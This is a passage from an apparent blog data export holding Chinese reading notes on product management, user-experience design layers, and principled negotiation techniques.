这个原型只是一个初稿，希望他们多给意见，以便修改得更好用，不必碍于情面不好意思说； 这个原型是用来测试产品，而不测试人，所以失败了不要紧，失败了才能说明出产品设计的不合理，有待改进； 只要有2-3个用户反映同一个问题，即开始着手马上修改，而不用等到更多用户来验证； 如果有连续6个用户表示理解和欣赏产品的价值，而且能完成关键的测试任务，就算完成了原型测试任务； 如果发现没有用户对产品感兴趣，或者让产品简单易用以使其理解产品的价值，则应赶快考虑放弃这个创意； 改进现有的产品1. 改进产品之前，首先要做的第一件事情是明确产品的目标（只要明确目标，才能不迷失改进的方向）；2. 考虑可以从哪些方面改善用户体验（到现场去观察用户是如何使用现有产品的，使用过程中存在哪些困难或困惑的地方）；3. 避免误区：一味的考虑如何增加新功能（增加功能并不能更好的让产品更好，事实常常正好相反，功能越多，用户对产品的评价越低）； 平滑部署1. 多数用户不喜欢产品出现更新，因为那往往意味着他们要改变操作习惯，以及花费时间重新学习；2. 应对措施： 提前通知； 新旧版本同时并行，让用户有学习过渡的时间； 灰度部署，即先从部分区域开始试用，以便提前发现一些问题并进行修正，为后续大规模的部署减少阻碍； 加强测试； 快速响应阶段1. 产品上线后不要急于撤退，而应该留出2-4周的时间，来快速响应；因为在上线后的一段时间内，会得到大量的用户反馈，这个时候可以用很小的成本，对产品做出很有价值的改进；2. 评估产品表现，应该通过各种可以量化的指标来进行，借助现有的各种成熟工具来获取指标数据；方法包括： 网站分析工具； 问卷法； 邮件、即时聊天工具、论坛、留言板等；3. 如果是企业级软件，产品上线后，应该派遣产品经理和设计人员到现场去驻点以收集大量有价值的反馈，这一点非常重要； 合理运用敏捷方法1. 敏捷方法缘起于定制软件，而在传统的定制软件行业中，并没有产品经理和交互设计的岗位，所以敏捷只提到设计可以和开发在同一个冲刺中实现；但对于产品软件来说，这样是不可行的，设计必须早于开发；2. 另外，由于产品软件往往面对海量用户，相对于定制软件数量有限的客户，软件的架构变得非常重要，所以必须提前设计好，而不是在敏捷执行过程中重构；3. 在敏捷开发中，产品经理的主要任务是提供可用的、有价值的原型和写用户故事； 合理运用瀑布式开发方法1. 瀑布式方法的优点是看起来有阶段性产出，所以让管理层感觉项目比较可控；缺点是软件行业充满了不可预测性，所以除非很小的项目，对可预测性抱乐观的理想主义经常是不现实的；2. 如果非得用瀑布式的方法，则重要的一点是在进入开发前应该将原型做好，并通过用户的验证； 创业型公司的产品探索1. 在创业的初期，最重要的人员不是程序员，而是负责以下三项工作的人员： 产品经理； 交互设计师； 原型制作师2. 在原型通过用户测试验证后，再招聘开发人员完全来得及，不仅节省时间，也节省金钱； 大公司如何创新1. 20%法则：给以员工20%的时间，去实践自己的创新想法；2. 臭鼬工程：员工利用自己的业余时间实践创新的点子；3. 主动观察：创新不是发现新问题，而是用新方法解决已有的问题；所以观察人们对现有产品的不满，是创新的最佳途径；4. 改善用户体验：提高用户体验意味着提高产品的使用效率；寻找现有产品中那些让用户失望的地方，想办法改进它们；5. 收购小公司：能够生存下来的小公司都有其独特之处，所以收购他们也不失为一种好办法； 在大公司大展拳脚1. 大公司的现实情况： 遵守一条规则：尽量规避风险； 矩阵式的部门：为了降低成本（因此在大公司里面要获得资源去完成一件事情，需要多个部门的合力支持）；2. 应采取的措施： 了解制定决策的方式：这样才可以找到正确的决策人，而不是被卡在一些非关键的人身上； 建立人脉网络：这样在需要帮助的时候，别人才会帮助你； 臭鼬工程：凭空申请资源很困难，所以先私下里和几个同事把东西原型做出来，之后再申请资源就会变得容易一些； 自己顶上：虽然大公司很多，但经常遭遇资源紧张，所以与其等待他人，自己顶上常常能更快的解决问题，不要让事情处于等待的状态； 有选择的据理力争：多一个敌人不如多一个朋友，所以除非是非常重要的事情，不要随便发脾气，另外要对事不对人； 会前沟通，形成默契：如果决策会议上有人反对，其他人就会附和，所以应在会议前，提前私下跟各关键决策人形成一致意见； 合理分配时间：大公司经常会有一些无关紧要的会议，学会拒绝，将自己的时间花在最重要的事情上面； 分享信息：分享的过程中会学到更多； 向上司借力：如果上司是一个有威望的人，则利用他的关系，可以更好的开展工作，应该充分加以利用，而不是单靠自己一个人埋头苦干； 传播你的产品理念：当一个理念得到足够传播的时候，它获得支持的可能性会大大上升；念念不忘，必有回想； 苹果公司的启示1. 硬件为软件服务（因为软件直接接触用户）；2. 软件为用户体验服务（用户体验不好的软件会让用户抓狂）；3. 用户体验为情感服务（要学会如何抓住人们的情感，因为情感是我们一切行为的动机）；4. 产品为真正的需求服务（手机并非苹果所创，但他们抓住了尚未被满足的需求）； 提防有特殊要求的产品1. 产品需求不能由用户说了算，原因如下： 用户在看到具体的产品之前，很难自己真正需要的是什么； 用户不知道什么样的产品是可行的（在当前的技术条件下）； 用户之间缺少沟通，需求很难统一；2. 解决办法： 用户在描述需求的时候，习惯提出自己的解决方案；产品经理应该与用户一起梳理需求，发现问题的本质，提供更合理的解决方案； 原则上是在保持产品通用用途的基础上，再考虑用户的定制或拓展需求，可以考虑由第三方供应商来解决拓展或定制的部分，最后集成在一起；3. 原则：产品经理应该确保产品是有价值的，并尽可能满足更多用户的通用需求（而不是一个用户的更多需求）； 新瓶装老酒1. 要想在成熟的市场抢占一席之地，应该掌握两件事情： 对目标市场了如指掌，对现有产品的缺陷洞若观火；（可以通过产品可用性测试掌握情况，包括自己的产品和竞争对手的产品） 跟踪最新的技术趋势，为老问题寻找更好的新办法； 产品中情感的作用1. 企业级消费者会出于恐惧和贪婪而购买产品；2. 个人消费者会出于自己的情感需求而购买产品；（马斯洛需求模型） 生理上的需求：吃穿睡； 安全上的需求：安全感； 情感和归属需求：相互的关系和照顾（友情、亲情、爱情、亲密关系） 尊重的需求：自我尊重和社会尊重； 自我实现的需求：道德感、创造力、自觉性、公正；3. 在可用性测试中，除了发现产品的问题，还应该了解是什么情感驱动用户来使用这个产品（情感是我们一切行为的动机）； 情感接纳曲线1. 不要从技术的角度问题，而应该从用户的情感角度思考问题：是什么让他们失望、愤怒、痛苦、恐惧？2. 关注非理性消费者的情感（因为他们会放大自己情感并做出行动，从而更容易被我们所观察，同时其背后也代表了其他理性的消费者的情感问题）3. 注意不要被新技术爱好者误导了自己的注意力焦点，他们做出的选择常常只是因为产品采用了新技术；4. 关注失望、不满、愤怒等一切情感的因素；5. 评估产品，重在评估它满足了什么样的情感需求，以及这种需求有多迫切；6. 带着新生的感受，去倾听、观察和感受每一天折磨用户的情感：孤独、恐惧、不满、愤怒等； 可用性与美感1. 交互设计影响了使用的方便与简单，视觉设计影响了美感与情感，二者缺一不可； 大众网络服务产品1. 10个要点 可用性：无须赘言； 人物角色：大众产品面对的用户众多，无法一一交流，所以设计几个典型的角色，如果有增加新功能，邀请典型用户进行测试； 扩展性：满负荷运载非常危险，容易导致系统崩溃，所以应该提前准备，即预留20%的空间余量来应对状况； 持续可用性：与拓展性一样重要； 客户服务：减少系统故障和缺陷，是降低客服压力的唯一办法，否则大众百万级的用户，会让客服系统压力暴涨； 保护用户隐私； 口碑营销：为用户的分享，创建便利的方式； 全球化：注意设计的易于本地化； 平滑部署：不中断服务的进行更新升级； 用户社区管理：好的产品会吸引用户参与，多倾听他们的声音，多给予参与回馈，让团队真正将用户当做上帝； 打造企业级产品的经验1. 应该处理好的10个问题： 可用性：注重交互设计与视觉设计； 产品正常工作：增加测试减少缺陷； 特例产品：不要误以为客户会告诉他们的需求，他们经常搞不懂自己真正要的是什么； 特约用户：认真倾听，通过现象发现问题的本质，向他们提供更好的解决方案并进行验证； 销售渠道的需求：根据产品通过不同的渠道销售，考虑给这些渠道商创造价值，比如系统集成商与增值转售商既有区别； 客户和用户的区别：买单的人，与实际用户不是同一个人，他们的需求不能代表最终用户，根据不同角色，要分别进行调研，确保产品价值； 产品安装：简单和傻瓜安装； 产品的配置、自定义与集成； 产品升级：简化升级技术和流程； 销售策略：因特网的出现，改变了传统的销售方式，多利用新的网络渠道进行销售； 打造平台级产品的经验1. 面临着3种角色的人员，分别是：终端用户、应用程序提供商、开发人员；2. 其需求各自不同：终端用户关注产品价值，能否解决自己的问题；应用商关心平台生存，别突然倒闭使自己的付出泡汤；开发人员关心平台开发的易用与简单；3. 其中最应该优先满足的需求是终端用户，只有受到终端用户认可的平台，才是成功并有可能生存下去的（做不到这一点，其他两项便是浮云无所依附；做好了这一点，则有可能形成繁荣的生态）； 最佳实践经验1. 产品管理的职责：不要与项目管理和营销管理搞混了；2. 用户体验：好的用户体验是产品的生命；3. 机会评估：用简便快捷的方式取代过时的市场需求文档；动手设计产品前，先明确产品要解决的问题，为谁解决，以及评估的标准；4. 特约用户：寻找特约用户，让其不断试用和改进；5. 产品原则：树立清晰的产品原则，有助于减少团队成员间的分歧；6. 人物角色：避免陷入为自己的需求设计的误区，时刻记住产品的目标用户是谁（最好写好后，贴在桌面旁边）；7. 探索产品：确保产品的价值、可用性、可行性；8. 使用原型：使用高保真原型，三个好处：方便用户试用、方便团队间沟通明确需求；9. 用户参与原型测试：通过用户测试验证产品的创意和设计；10. 根据数据改进产品：改进产品不是一味增加新功能，而是围绕产品的目标，寻找反映目标的数据指标，追求这些指标的上升； 产品经理的反省清单1. 每天要思考的10个问题 产品能够吸引目标消费者的关注吗？（如果不能，是因为什么，营销不够，还是产品不好？） 我了解目标用户吗？现有的产品是否得到了他们的认可？（去用户现场调查，以及通过反馈和社区倾听用户的声音） 产品是否完整？用户对产品的印象如何？销售业绩如何？销售业务是否能够完成？ 产品值钱吗？值多少钱？为什么值这么多钱？用户会选择更便宜的产品吗？ 产品能正常运行吗？ 产品的设计是否人性化，易于操作？（多做可用性测试，多去现场观察用户是如何使用自己的产品的） 产品的特色是否与目标用户的需求一致？产品的特色是否鲜明？ 产品能够在竞争中取胜吗？面对不可预测的市场变化，产品是否仍然有取胜的把握？（竞争对手的产品的优缺点有哪些，用户为什么喜欢它们，喜欢什么；以及用户为什么不喜欢它们，不喜欢什么）（走出办公室，去用户的现场了解答案） 产品是否有别于市面上竞争对手的产品？我能否在2分钟内向高管解释清楚区别？1分钟内向客户解释区别？半分钟内向行业分析师解释区别？ 我了解其他团队成员对产品的看法吗？他们的觉得产品如何做才能更好？他们的看法与我的看法是一致的吗?","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"产品","slug":"产品","permalink":"http://example.com/tags/%E4%BA%A7%E5%93%81/"}]},{"title":"用户体验要素","slug":"用户体验要素","date":"2016-01-20T13:09:00.000Z","updated":"2024-09-22T23:08:43.583Z","comments":true,"path":"2016/01/20/用户体验要素/","permalink":"http://example.com/2016/01/20/%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C%E8%A6%81%E7%B4%A0/","excerpt":"","text":"认识有哪些要素： 5个要素：（注意功能型与信息型的不同） 表现层：交付成果为视觉模板或设计合成品 视觉效果; 感知体验； 框架层：交付成果为线框图 排版布局； 界面设计：如何让用户产生互动； 导航设计：如何组合元素让用户在信息架构中穿行； 结构层：交付成果为示意图或流程图 功能型：交互设计；（用户如何通过一系列的动作完成任务） 信息型：信息架构；（如何组织内容，以便最便捷的呈现给用户） 范围层： 功能型：功能清单； 信息型：内容需求； 战略层：目的； 网站的目的：产品目标； 用户的目的：用户需求； 网站的2种目的： 信息型：用户上来是为了浏览信息； 功能型：用户上来是为了完成任务； 网站的2种重要额外的因素： 内容：有价值的内容才是网站存在的目的，不然就是买椟还珠了； 技术：使以前的不可能变得可能； 战略层 2个好问题： 我们想通过这个产品得到什么？（答案即是我们的产品目标） 我们的用户想通过这个产品得到什么？（答案即是用户需求） 产品目标： 商业目标：要么赚钱，要么省钱； 品牌识别：我们想让用户感知到我们是怎么样的一种产品？我们身份标识？安全、高效、简单、快捷等？ 成功标准：通过哪些可追踪的指标，来判断产品上线后有满足我们的目标以及用户的需求？ 用户需求： 用户细分：先定义谁是我们的用户？ 用户调研：用各种调研方法，了解用户是谁，他们需要什么； 人物角色：当找到目标用户后，为他们建立身份；以便未来时刻提醒自己，我们在为他们为设计，而不是为自己； 范围层 想明白要做什么，不做什么，先做什么； 获得需求：多接触用户，多询问，5个WHY法（鱼骨图）； 定义需求：做为什么角色，我希望什么效果，这样就可以获得什么利益； 确定优先级： 需求是否满足战略目标？ 需求的实现可行性大小？时间、成本、依赖关系等； 结构层 假如我们现在知道人体需要哪些功能各异的器官了，接下来要做的是，如何把这些器官组织在一起； 对于内容，通过信息架构来构建用户体验； 对于任务，通过交互设计关注可能的用户行为，以及系统如何配合与响应这些用户行为 概念模型：用户对于交互组件将怎样工作的观点； 错误处理 最好的方法：设计成不可能犯错的方式； 其次的方法：让错误难以发生； 最后的方法：提供撤销功能；如果不可撤销，则只能依赖于大量的警告； 信息架构 关注：呈现给用户的信息是否合理并具有意义； 对于内容为主的网站，主要工作在于设计组织分类和导航的结构，以便用户可以高效率的浏览网站的内容； 从上到下和从下到上的方法，各有优缺点，应结合使用； 结构质量是最重要的标准，而不是“整个过程一共需要多少步骤”，而是“用户是否认为每一个步骤都是合理的”，以及“当前的步骤是否自然延续了上一个步骤中的任务” 一个高效结构的优点就是具备“容纳成长和适应变动”的能力； 信息架构的基本单位是“节点”，它是一种抽象概念，可大可小，取决于我们在考虑哪一个层级的内容架构，它可以小到一个字段，也可以大到整个图书馆； 常见结构 层级结构（树）： 矩阵结构：按主题，按角色，按场景、按地区 线性结构：书籍，教案 自然结构：适合于鼓励探索，自由冒险的场景； 组织原则 一般来说，最高层级使用的组织原则应该紧密与网站目标和用户需求相关；而在结构中较低的层级，更多考虑内容与功能需求； 我们的困难不在于创建一个结构，而在于创建一个与“我们的目标”与“用户的需求”相对应的、正确的结构； 语言和元数据 “使用用户的语言”和“保持一致性”非常重要，确保用户易于理解；实现这个目标的工具是“受控词典”；它是网站使用的一套标准语言； 控制词汇的另外一种较为精细的方法是类词词典； 元数据：关于信息的信息，以结构化的方式来描述内容； 将类词词典、元数据和搜索引擎结合起来使用，就能够得到更好的搜索结果； 团队角色和流程 信息架构或交互设计的主要文档是“示意图”，用视觉化的语言来呈现结构； 使用视觉词典以规范化的绘制架构图，链接：jjg.net&#x2F;ia&#x2F;visvocab 框架层：界面设计、导航设计和信息设计 定义：结构层更侧重于概念层面，框架层则侧重于实现这些概念，它主要关注组件以及组件之间的相互关系； 功能型：界面设计，提供给用户做某事的能力； 信息型：导航设计，提供给用户去某地的能力； 二者：信息设计，呈现有效的信息沟通，传达想法给用户； 习惯和比喻 注意保持用户使用习惯的一致性，不管是在系统内部，还是在环境之中 想想电话机按钮布局、或者计算器键盘的例子 人们通过条件反射会减少出错概率，降低学习成本，提高操作速度 如果有两个特性使用了相同的概念模型，则它们会有比较类似的界面设计，熟悉一个，可以很快的熟悉另外一个； 谨慎而克制的使用比喻，很多时候它并不能提示事物的本质 尽可能避免让用户猜测 界面设计：选择正确的界面元素 成功的界面设计是那些让用户一眼看到“最重要的东西”的界面设计（弱化显示不重要的东西，甚至隐藏它们） 技巧 在这个界面第一次呈现给用户的时候，仔细考虑每一个选项的默认值 记住用户最后一次选择的状态； 导航设计 三个目标 必须提供给用户一种在网站间跳转的方法 必须传达出这些元素和它所包含的内容之间的关系 必须传达出它的内容和当前所浏览的页面之间的关系 清晰的告诉用户“现在在哪儿”，以及“他们能去哪儿” 大多数网站都会提供多重的导航系统 几种常见的导航 全局导航：提供了一种可以到达整个网站的通路（但并不意味着它是固定的，每个页面可见的） 局部导航：提供了用户在这个架构中到达附近地点的通路 辅助导航：提供了前两者不能快速到达的相关内容的快捷途径； 上下文导航：也在内联导航，当用户在阅读内容的过程中，如果想进一步了解信息，可以通过内联导航到达； 友好导航：提供给用户一些他们通常不会使用的链接，例如：联系信息、反馈表单、法律声明等； 远程导航：独立于网站的内容和功能，处理全局和局部导航无法处理的一些场景 网站地图：提供一个简明的、单页的网站整体架构 索引表：对于有大量主题和内容的网站特别有用 信息设计 最关键的，是要以一种能够“反映用户的思路”和“支持他们的任务和目标”的方式来分类和排列信息元素 指示标识： 用来帮助用户理解“他们在哪儿”以及“他们能去哪儿”的系统； 注意使用颜色来强化标识； 线框图 文档本身并不是目的，它只是达到目的的一种手段；根据实际的需求来撰写正确级别的文档，同时也不要欺骗自己能够使用较少的文档糊弄过去，才能将文档从一件麻烦事变成一件有益的事； 线框图是整合三个要素的方法： 通过安排和选择界面元素来整合界面设计 通过识别和定义核心导航系统来整合导航设计 通过放置和排列信息组成部分的优先级来整合信息设计 表现层 定义：决定各项元素在视觉上如何呈现； 人的五官：嗅觉和味觉侧重食物，触觉侧重于工业设计，听觉侧重通过声音来辅助用户，如汽车导航，视觉则是用户体验设计最着重的领域； 应该将注意力集中在它们“动作是否良好”之上，而不是它们是否具有美感；因为视觉设计需要支持前面四层设计的目标； 忠于眼睛，评估一个产品视觉设计的简单方法之一，是询问如下问题： 你的视线首先落在什么地方？ 哪个设计要素在第一时间吸引了用户的注意力？ 它们对于战略目标来讲是很重要的东西吗？ 用户第一时间注意到的东西与他们（或你）的目标是背道而驰的吗？ 对比和一致性 通过对比可以将用户的视觉注意力吸引到界面中的关键部分； 保持设计的一致性，可以有效的传达信息，而不会造成用户的困惑； 基于栅格线 内部和外部的一致性 将在不同环境中反复出现的元素，独立提取出来，一次性设计，试着在每个环境中应用它们，然后在需要的时候进行调整； 配色方案和排版 色彩是传递品牌识别的一个重要方法； 通常情况下，更亮更醒目的颜色适用于前景元素；较暗较淡的颜色适用于背景元素； 排版：简单就好，因为内容占据较大的面积并被用户长期注视，因此花哨的方案容易使人感觉到疲劳； 原则：不要使用非常相似，但又不完全一样的风格； 设计合成品和风格指南 设计合成品：基于线框图制作的，进一步呈现视觉效果的可视化产品； 风格指南 避免人员流动导致的知识流失和集体失忆； 目标：提供足够的细节来帮助人们将来做出明智的决策； 另外也有助于在一个分散的企业中保持设计的一致性； 要素的应用 创建良好用户体验最重要的工作内容是大量收集亟待解决的非常细微的问题 了解你正在试着去解决的问题 了解这些解决办法所造成的后果 提出正确的问题：将每一个决定都建立在对其背后议题的理解之上，询问自己：你为什么要这么做？ 最大的挑战：比用户更准确地理解他们的需求，不能简单的依赖用户来阐明需求；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"谈判力","slug":"谈判力","date":"2016-01-18T01:12:00.000Z","updated":"2024-09-22T23:11:23.255Z","comments":true,"path":"2016/01/18/谈判力/","permalink":"http://example.com/2016/01/18/%E8%B0%88%E5%88%A4%E5%8A%9B/","excerpt":"","text":"一、常见问题 不要在立场上面讨价还价 那什么是立场？按百度，它是指：认识和处理问题时所处的地位和所抱的态度 为什么不要讨价还价？是因为双方所处地位和态度天然不同，所以要接受这个事实，尝试理解对方，而不是说服对方更换立场； 讨论立场容易妨碍事情的正常进行，比如明智、有效率、友善的谈判；因为双方注意力没有放在真正重要的点上；同时它会跟脸面挂钩起来，导致双方从维护利益变成了维护面子，这样就跑题了； 谈判有两个层次： 解决实质问题； 解决问题的程序：这一点很重要，却经常被忽略；它其实是双方在谈判前先达成一致的游戏规则，然后双方遵照这个规则，来解决实质性的问题；（一般都有哪些常见的游戏规则？估计是接下来的四要素） 谈判的四个要素： 把人和事分开：人是有感情的动物，容易产生情绪反应，所以应该和事分开，正面的肯定人，客观的讨论事；避免对人产生评价或攻击； 着眼于利益而不是立场：尊重对方的立场，不去反对或试图说服；而是列出实质性的利益点来讨论； 为共同利益选择方式：解决事情的方案不止一种，双方有必要花费时间创造更多可选择的方案； 坚持使用客观标准：每个人的价值观是不一样的，所以务必以双方认同的客观标准，来衡量和评估方案的价值，而不是按个人的主观意愿来判断； 谈判的三个步骤： 收集：思考双方可能不同的认识，不同的利益，交流的障碍有哪些； 思考：怎样处理人际关系问题；对方最重要的利益点是什么；我的现实目标是什么； 协商：双方交流意见；四个要素是双方讨论的最佳话题； 二、把人和事分开 谈判者是人：所以对方会有各种人的各种反应和本能，要尊重这些人性；比如情绪问题、面子问题； 谈判者都有两方面的利益：实质利益和关系利益；前者是要讨论的，后者是不需要讨论，但要尊重和维护的；务必不要将二者对立起来，为了实质利益而牺牲关系利益； 分开实质利益和关系利益的方法：直接解决人际问题，方式包括如下 认知：尊重人与人认识不同的事实，先仔细倾听对方的想法，并在必要时复述确认自己的理解一致，不要以自己的观点推测别人的意图及指责对方； 讨论各自对问题的认识； 让对方参与其中，使其感到谈判结果对双方都有利害关系； 保全面子：使提议尽量与对方的观念一致，与谈判的自我形象维护相协调； 情绪： 承认并理解自己和对方的情绪：可以将现场的情绪在本子上记下来，时刻提醒自己大家的情绪处于什么状态； 问自己这些情绪是怎么来的； 将情绪陈述出来，并承认有情绪是正常的。大家可以针对情绪进行讨论，即与对方谈谈他们的心情，也谈谈我们自己的； 让对方发泄情绪；坏情绪发泄出来后，会获得心理上的轻松；静静倾听，并不时示意对方继续，直到对方说完为止； 不要对情绪的冲动做出回应；另外可以在谈判前规定每次只能有一个人发火； 采取象征性的姿态：如果表示歉意，即使不是真的我们错了；送一些小礼物，或者一声问候，或者一句遗憾的表示，或者一起吃饭； 交流： 认真倾听并理解对方的意思；技巧包括：集中精力、要求对方清楚阐明意图、没把握时要求对方重复；对方说话过程中尽量不要回应，而是尝试理解； 最好建立私下的交流渠道，避免其他第三方人员分散注意力； 只谈自己，不说对方；即只谈对自己的影响，或者自己的感受，而不讨论或谴责对方的意图或方案； 有目的的说话：随便开口乱说话有时会造成障碍，比如对方在情绪上头的时候，有些话我们需要先放在心里；在做重要表态前，先想清楚自己这么说的意图或者想要得的信息；有质量的交流，而不是胡乱交流； 防患于未然：在谈判之前应该做的一些事情； 与对方建立良好的合作关系； 对事不对人，视对方为合作者，而不是对手；比如可以在开始谈判前将问题摆出来，表示合作有助于双方利益的最大化，以便达成合作有益的共识； 三、着眼于利益，而不是立场 利益是问题的关键，谈判的根本问题不在于立场上的冲突，而在于双方的需求、愿望、想法和甚至恐惧的冲突；利益驱动人的行为，是立场背后的真正动机；所以，要搞清楚对方的动机是什么，即他坚持某些立场的真正原因； 在大多数谈判中，如果认真分析双方的潜在利益，会发现双方之间的共同利益远多于对立的利益；共同利益加上互补的不同利益是达成好协议的基础； 如何确定利益： 多问自己对方为什么这么做；如果是要问对方，注意表达的语气中透露想尽量理解对方的意图，不然会造成对方捍卫自己的立场； 我们希望对方做某些选择，但他们却不这么做，那么我们应该问问自己他们为什么不这么做，这么做会影响他们的什么利益； 思考对方如何按照我们的期望做出决定，或者拒绝这么做，对他们会有什么后果，包括：个人利益、集体利益； 人的基本需求：安全感、经济利益、归属感、获得他人的认同、能主宰自己的生活； 讨论利益： 清晰、具体的表达自己的利益诉求以及它们的合理性（具体很重要）；但不要否定对方的利益不重要或不合理；同时提示如果自己有出现错误的地方，请对方随时纠正（如果对方没有纠正，说明对方认同我们所提出的利益诉求）； 承认对方的利益，并表示重视，同时将其利益列入为待解决的问题的一部分； 先讲问题，之后再讲方案；如果一开始搬出方案，可能会导致对方分散注意力去想他的方案； 向前看不回头；即讨论下一步应该采取的行动计划，或者双方追求的利益终点（目的），而不纠缠于争论过去已经发生的事实；（这里涉及了沉没成本与边际收益两个概念） 具体而不失灵活，乐于接受新的想法；谈判前，多想想几种自己可以接受的方案，而不是空手跑去等听对方的建议；问自己：如果对方明天接受我的提议，那我希望对方接受什么； 原则：不仅要全力对付问题，而且要全力支持对方（此种认知不一致方式，有助于对方客观的看待和分析问题）；对自己的利益强硬，从而施加压力，但同时全力支持对方的人本身，从而使得对方愿意尝试一起思考解决方案； 四、 为共同利益创造选择方案 经常阻碍人们创造多种选择方案的四个原因： 不成熟的判断； 寻求单一的答案； 以为馅饼的大小是不变的； 认为“他们的问题应该由他们解决”； 解决办法： 将创造方案跟评判方案两个过程分开； 扩大谈判桌上的选择，不要只寻求一种答案； 寻求共同利益； 找到让对方容易决策的办法； 集体讨论的方法：（很像头脑风暴） 明确目的：希望带着什么样的结果走出会议室； 寻找几个参与者； 选择非正式的、放松的环境和氛围； 选一个主持人，以便确保不跑题； 让大家并排坐着，共同面对问题； 发言前明确基本原则； 集思广益，各抒已见；记下每一个想法，让其一目了然（可能需要投影或张贴出来），履行不批判原则； 收集足够的想法后，将最有希望的想法标示出来，改进它； 将各种改进后的想法整理成列表，另外确定一个时间来评估它，商定哪些想法可用于谈判，以及怎样谈判； 创造选择方案的四个步骤： 问题：出了什么问题；存在哪些症状；希望的情况如何；不希望的情况如何 分析：给症状分类；为症状寻找原因；发现解决问题的障碍所在； 方法：可能的措施；理论上的可行方法；找出总体可行的方案； 行动计划：可以做什么；解决问题的具体步骤； 从不同的专业视角看待问题：比如从不同职业不同学科，来分析同一个问题；然后思考不同的人，会如何解决一个相同的问题； 创造几种力度不同的协议：比如永久性vs临时性，无条件vs有条件，实质性的vs程序性的，全面的vs部分的，一锤定音的vs原则上的，有约束力的vs无约束力的，重要的vs次要的； 缩小协议的范围：比如翻译一本书定价，改成先为翻译一个章节定价； 扩大协议的范围：比如原讨论一个项目，可以考虑通过引入其他方，讨论多个项目；在单个项目上的利益让步，或许可以在多个其他项目上回报； 寻求共同利益： 明确共同利益（注：共同利益隐藏在每一项谈判中，需要花时间寻找，而不是天上掉馅饼，讨论共同利益会让谈判过程更加愉快顺利）； 询问对方有何倾向（注：只是倾向，而不是决定）（通过倾向选出一种方案后，再继续往下完善，这样可以逐步找到对双方最合适的方案）; 给对方决策以方便； 不要让对方觉得事情难办，而要一开始就让对方面临的选择尽可能简单明了； 试着起草几份协议，用这个方式帮忙自己理清思路； 避免使用威胁，而是表示如果对方做出某个选择，我们愿意做些什么，这样的沟通更加有效； 分析对方采用方案时，所面临的批评是什么；以便让自己了解沟通中可能遇到的障碍； 把方案用“可同意的提案”的形式写出来，对方只需要回答“可以”即可；避免让自己只关注自己的利益，忘了对方的利益； 五、坚持使用客观标准 凭个人意愿和利益冲突来谈判，需要付出巨大的代价；所以好的解决方案是：根据客观标准来谈判； 原则谈判有助于愉快有效的达成协议； 避免双方争夺谈判的主动权，有助于维护双方的关系； 如何制定客观标准： 公平标准； 客观标准应该不受双方意愿的干扰； 客观标准至少在理论上对双方都适用； 公平程序；（一切一挑、排序、抽签、由他人决定） 如何运用客观标准进行谈判： 双方就每一个问题共同寻求客观标准； 以理服人，并乐于接受合理劝说，以确定最合适的标准，及其运用的方式； 遵从原则，绝不屈服于压力； 六、确定最佳替代方案 面对实力强大的对手时，最好的谈判结局是如下两个目标： 保护自己，不至于接受本应拒绝的协议； 让你的谈判资源发挥最大效用，使其达成的协议能尽量满足你的利益需求； 保护自己，可以通过设置底线来实现，但这样也会付出相应的代价，即减少了谈判的灵活性，限制了自己的选择和想象力；虽然底线可以避免自己接受一个很糟糕的协议，但也限制了自己设计更富新意的选择方案，或接受其他更明智的选择； 制定最佳替代方案的原因； 如果没有认真考虑谈判失败后的措施，就等于是毫无目的的在谈判； 积极寻找自己谈判破裂后所面临的选择，能很大程度上的增强自己的实力； 制定最佳替代方案的步骤： 提出如果不能达成协议自己所要采取的措施； 完善其中最有希望的想法，并把它转成行动方案； 初步选定看上去最好的替代方案； 制定一条警戒线（警戒线应该给自己留有余地） 谈判双方的相对实力主要取决于各方能在多大程度上承担谈判破裂的后果； 是否透露最佳替代给对方，对决于对方想象的我们的最佳替代方案，比我们自己制定的方案是更好，还是更差；如果更差，就透露；如果更好，就不透露； 思考对方的最佳替代方案；如果他们高估了自己的替代方案，就设法降低他们的期望值；如果两边的最佳替代方案都对自己有利，那最好的解决办法就是双方不达成协议； 七、谈判柔术：如果对方不合作怎么办 三种基本策略： 我们能做什么：注重原则而不是立场，即本书前面篇幅讨论的主题； 对方能做什么：引出对方的各项主张，顺着他们的思路，落实到每一项的具体利益，展开讨论这些主张（包括探讨共同利益、制定选择方案、寻找客观标准）； 第三方能做什么：通过引入独立的调解程序或工具，来解决问题； 谈判柔术的几种做法： 不要攻击对方的立场，而是透过立场看对方诉求的利益； 不要替自己的想法辩护，欢迎批评和建议； 引导对方换位思考，征求对方的意见； 变人身攻击为针对问题的批评；（比如指出对方攻击我们的原因，是出于他对某个群体的某项利益的重视，这样会让对方很受用，同时指出我们也很重视）； 提问和停顿：如果使用陈述，会引来对方的反驳和对抗；如果使用提问，则会引来对方的答案； 沉默是一项很好的武器，要充分利用它（如果对方提出一些站不住脚的攻击，可以用沉默来回答；另外提出疑问后，采用沉默停顿，而不急于提出我们的见解，这样有利于对方思考和给予逃避尖锐问题的机会）； 使用独立调解程序：身为局外人，更容易将人和事分开，直接讨论双方的利益和选择； 独立第三方，通过了解双方的利益诉求，之后制定草案，然后征求双方的修改意见，并进行多轮的循环和修改，直到最终得到一份双方都满意的方案； 提出方案之前先提出理由，不然对方在听到方案后，注意力会放到思考如何对方案进行反驳，而不再听得进方案背后的理由； 八、如果对方使用卑鄙的手段怎么办 三步骤：发现诡计、揭穿诡计、质疑诡计的合理性与可取性； 方法：把人和事分开、着眼于利益而不是立场、为共同利益创造选择方案、坚持使用客观标准、使用最佳替代方案； 一些常见的诡计策略及应对方法： 虚假事实：把人和事分开，除非有充分的理由，不要相信别人； 模糊的权限：在互相让步前，先确认权限；如果对方表示需要请示并最终产生修改，则我方也保持修改协议的权利，即双方都有权提出修改的意见； 令人怀疑的意图：如果不能保证对方的履行协议，则可以在协议中增加对赌，比如对方如果没有履行承诺，需要承担什么样的重大后果； 一些心理战术： 压抑的环境：如果发现环境让自己不舒服，思考为什么，并提出来，或者另外约时间和地点； 人身攻击：挑明这个问题，以便使对方的技俩失效； 红白脸战术：坚持客观标准的原则，即以客观标准来评判对方的方案是否合理； 